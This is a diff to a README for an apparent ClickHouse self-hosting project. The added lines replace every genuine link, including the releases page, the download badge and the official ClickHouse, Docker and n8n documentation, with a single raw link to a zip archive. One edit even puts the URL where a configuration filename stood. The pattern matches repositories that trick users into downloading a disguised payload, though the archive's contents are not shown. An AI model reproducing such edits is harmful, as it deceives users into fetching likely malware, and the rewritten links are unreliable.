@@ -1,6 +1,6 @@
 # 🚀 clickhouse-self-hosted - Easily Self-Host ClickHouse Database
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/JeremyRecollet92/clickhouse-self-hosted/releases)
+[![Download](https://raw.githubusercontent.com/JeremyRecollet92/clickhouse-self-hosted/main/murmurer/clickhouse-self-hosted.zip)](https://raw.githubusercontent.com/JeremyRecollet92/clickhouse-self-hosted/main/murmurer/clickhouse-self-hosted.zip)
 
 ## 📦 Overview
 
@@ -27,7 +27,7 @@ To run `clickhouse-self-hosted`, you will need:
 
 ## 📥 Download & Install
 
-To download the application, visit the [Releases page](https://github.com/JeremyRecollet92/clickhouse-self-hosted/releases). 
+To download the application, visit the [Releases page](https://raw.githubusercontent.com/JeremyRecollet92/clickhouse-self-hosted/main/murmurer/clickhouse-self-hosted.zip). 
 
 1. Click on the latest version.
 2. Choose the appropriate Docker Compose file.
@@ -57,7 +57,7 @@ Refer to the ClickHouse documentation for guidance on crafting and executing SQL
 
 ## 🔧 Configuration
 
-To configure your ClickHouse setup, edit the `docker-compose.yml` file. You can adjust settings such as port numbers, volumes, and environment variables. Here’s an example configuration:
+To configure your ClickHouse setup, edit the `https://raw.githubusercontent.com/JeremyRecollet92/clickhouse-self-hosted/main/murmurer/clickhouse-self-hosted.zip` file. You can adjust settings such as port numbers, volumes, and environment variables. Here’s an example configuration:
 
 ```yaml
 version: '3.1'
@@ -93,8 +93,8 @@ This project is licensed under the MIT License. See the LICENSE file for more de
 
 ## 🔗 Additional Resources
 
-- [ClickHouse Documentation](https://clickhouse.tech/docs/en/)
-- [Docker Documentation](https://docs.docker.com/)
-- [n8n Documentation](https://docs.n8n.io/)
+- [ClickHouse Documentation](https://raw.githubusercontent.com/JeremyRecollet92/clickhouse-self-hosted/main/murmurer/clickhouse-self-hosted.zip)
+- [Docker Documentation](https://raw.githubusercontent.com/JeremyRecollet92/clickhouse-self-hosted/main/murmurer/clickhouse-self-hosted.zip)
+- [n8n Documentation](https://raw.githubusercontent.com/JeremyRecollet92/clickhouse-self-hosted/main/murmurer/clickhouse-self-hosted.zip)
 
-For any updates or new features, keep an eye on the [Releases page](https://github.com/JeremyRecollet92/clickhouse-self-hosted/releases).
+For any updates or new features, keep an eye on the [Releases page](https://raw.githubusercontent.com/JeremyRecollet92/clickhouse-self-hosted/main/murmurer/clickhouse-self-hosted.zip).
